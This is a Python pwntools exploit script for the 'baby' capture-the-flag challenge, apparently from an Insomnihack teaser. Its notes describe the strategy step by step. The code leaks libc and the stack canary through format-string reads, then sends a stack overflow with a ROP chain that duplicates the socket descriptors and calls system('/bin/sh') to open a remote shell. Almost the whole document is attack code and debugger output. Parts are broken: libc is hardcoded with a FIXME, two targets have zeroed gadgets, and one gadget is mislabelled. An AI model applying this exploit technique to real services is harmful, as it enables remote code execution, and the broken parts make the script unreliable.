#!/usr/bin/env python
# -*- coding: utf-8 -*-

'''
Tricks:
========
Rename to libc.so.6 and:
LD_LIBRARY_PATH=. ./baby


Strategy:
==========
1. Leak a libc address from the stack and calculate the libc base address
2. Leak the stack cookie
3. Trigger the buffer overflow and get RIP control
4. Do some rop magic


Registers controlled after crash
=================================
RBP: 0x4545454545454545 ('EEEEEEEE')
RSP: 0x7ffe895c44e8 ("DDDDDDDDAAA%AAsAABAA$AAn
RIP: 0x7fc5e80e94c7 (<dostack+181>: ret)
R13: 0x7ffe895c4650 ("A%pA%TA%qA%UA%r", 'A' <repeats 185 times>...)   //  [R13] --> offset 352 - size ~43


1)  Cookie stored at the beginning of the function at [rbp - 8]
 
Cookie breakpoint  Ref: [1] 
=============================
- Prologue
    br *dofmt+17 
       0x7f379ee674d9 <dofmt+17>:   mov    rax,QWORD PTR fs:0x28         // copy canary pointer into RAX
    => 0x7f379ee674e2 <dofmt+26>:   mov    QWORD PTR [rbp-0x8],rax       // copy the canary content into [RBP-0x8]
       0x7f379ee674e6 <dofmt+30>:   xor    eax,eax                       // zero out the canary 

    br *dofmt+135
            RAX: 0x83511eb77edda800 

- Epilogue
    br *dostack+160
       0x7fd9efbe14b2 <dostack+160>:    mov    rcx,QWORD PTR [rbp-0x8]
    => 0x7fd9efbe14b6 <dostack+164>:    xor    rcx,QWORD PTR fs:0x28
       0x7fd9efbe14bf <dostack+173>:    je     0x7fd9efbe14c6 <dostack+180>
       0x7fd9efbe14c1 <dostack+175>:    call   0x7fd9efbe0e30 <__stack_chk_fail@plt>
        
        RCX: 0xec3c87dd37f3f200

        RCX takes the [RBP-8] and the cookie (fs:0x28) and XOR them. If !=0, then cookie was tampered with


2) Libc and system
> rabin2 -s libc.so.6 | grep system
vaddr=0x00045390 paddr=0x00045390 ord=584 fwd=NONE sz=45 bind=GLOBAL type=FUNC name=__libc_system


3)  Overflow RIP
    
    Payload  = "A"* 1032 + cookie + RBP + RIP

4) Build the ROP chain

According to the x86_64 ABI, the first 6 integer or pointer arguments to a function are passed in registers. 
The first is placed in rdi, the second in rsi, the third in rdx, and then rcx, r8 and r9. 
Only the 7th argument and onwards are passed on the stack.

    RDI
    RSI
    RDX
    RCX
    R8
    R9


Possible gadgets
==================
1) Get "/bin/sh" into RDI
    0x0000000000022482 : pop rdi ; ret
    
    gdb-peda$ find "/bin/sh"
    Searching for '/bin/sh' in: None ranges
    Found 2 results, display max 2 items:
      libc : 0x7fc5e7c7d3e8 --> 0x68732f6e69622f ('/bin/sh')
    [heap] : 0x7fc5e9acf05b --> 0x68732f6e69622f ('/bin/sh')

GDB breakpoints right before the ROP chain
===========================================
    gdb-peda$ br *dostack+180
    gdb-peda$ set follow-fork-mode child
    gdb-peda$ c


[1].- https://xorl.wordpress.com/2010/10/14/linux-glibc-stack-canary-values/
'''

import re
import sys 
from pwn import *


def perror():
    sys.exit("python {0} [remote|local] [remote|ubuntu1404|debian8]".format(sys.argv[0]))


def check_args():
    PORT = 1337
    oses = ["remote", "ubuntu1404", "debian8"]

    try:
        arg1 = str(sys.argv[1])
        arg2 = str(sys.argv[2])
    except:
        perror()

    if (arg1 == "" or arg2 == ""):
        perror()
    
    if (arg2 not in oses):
        perror()

    if (arg1 == "remote"):
        HOST = "baby.teaser.insomnihack.ch"
    elif (arg1 == "local"):
        HOST = "127.0.0.1"
    else:
        perror()      

    return HOST, PORT, arg2


def chain2string_x64(rop):
    return "".join([p64(x) for x in rop])


def pause():
    print "[*] Paused, press ENTER to continue."
    raw_input()


def dofmt(s):
    choice = "2"

    global libc, cookie

    s.readuntil("> ")
    s.sendline(choice)
    s.readuntil("> ")
    s.sendline("%158$llx")      
    libc_str = s.recvline().strip()
    libc = int(libc_str,16)
    log.info("2.dofmt()=> Leaking <__libc_start_main+245> at: {:x}".format(libc))
    

    s.readuntil("> ")
    s.sendline("%138$llx")
    cookie = s.recvline().strip()
    cookie = (re.search(r"[0-9A-Fa-f]{16}", cookie)).group(0)
    log.info("2.dofmt()=> Leaking stack cookie: {}".format(cookie))
    print "cookie:%s:" %cookie
    assert(len(cookie) == 16)
    cookie = p64(int(cookie,16))
    
    #pause()

    # Back to main menu
    s.sendline("")


def  dostack(s, os_target):
    log.info("1.dostack()=> ")

    choice = "1"
    
    # Generate payload
    RBP = "EEEEEEEE"
    RIP = "DDDDDDDD"
    ROPCHAIN = rop(os_target)

    # buff = "A"* 1032 + cookie + RBP + RIP 
    buff = "A"* 1032 + cookie + RBP + ROPCHAIN

    log.info("Sending choice {}".format(choice))
    s.sendline(choice)
    
    s.readuntil("bytes you want to send ? ")
    buffsz = str(len(buff))
    s.sendline(buffsz)
    s.send(buff)  # sendline?

    log.info("got root?")
    s.interactive()


def rop(os_target):  
    log.info("Building ROP chain")
    
    # Calculate libc base address    
    libc = 0x00007f5d95888000   # FIXME!!!

    if os_target == "debian8":
        # gadgets
        pop_rdi_ret     = libc + 0x22482
        pop_rsi_ret     = libc + 0x24125
        pop_rsi_r15_ret = libc + 0x22480

        # offsets
        system = libc + 0x41490
        dup2   = libc + 0xdc240
        binsh  = libc + 0x1633e8

    elif os_target == "ubuntu1404":
        pop_rdi_ret = 0x0
    elif os_target == "remote":
        pop_rdi_ret = 0x0
    else:  #local
        perror()

    # ROP attack => dup(4,0); dup(4,1); system("/bin/sh")

    # Functions usually return the lowest possible file descriptor. Standard input, output, and error are 0, 1, and 2 respectively. 
    # socket may return 3. Then accept is likely to return 4.
    ropchain = [
        pop_rdi_ret ,
        4           ,  # rdi = 4 
        pop_rsi_ret ,
        0           ,  # rsi = 0
        dup2        ,  # dup2(4,0)
        pop_rdi_ret ,
        4           ,  # rdi = 4 
        pop_rsi_ret ,
        1           ,  # rsi = 1
        dup2        ,  # dup2(4,1)
        pop_rsi_ret ,
        binsh       ,  # rdi = "/bin/sh\x00"
        system      ,  # system("/bin/sh")
    ]
    
    return chain2string_x64(ropchain)


def main():
    # check input
    host, port, os_target = check_args()

    # create connection
    s = remote(host, port)

    # leak libc and stack cookie
    dofmt(s)

    # trigger the stack-based buffer overflow doing some ROP magic
    dostack(s, os_target)


if __name__ == '__main__':  
    try:
        main()
    except KeyboardInterrupt:
        sys.exit(0)


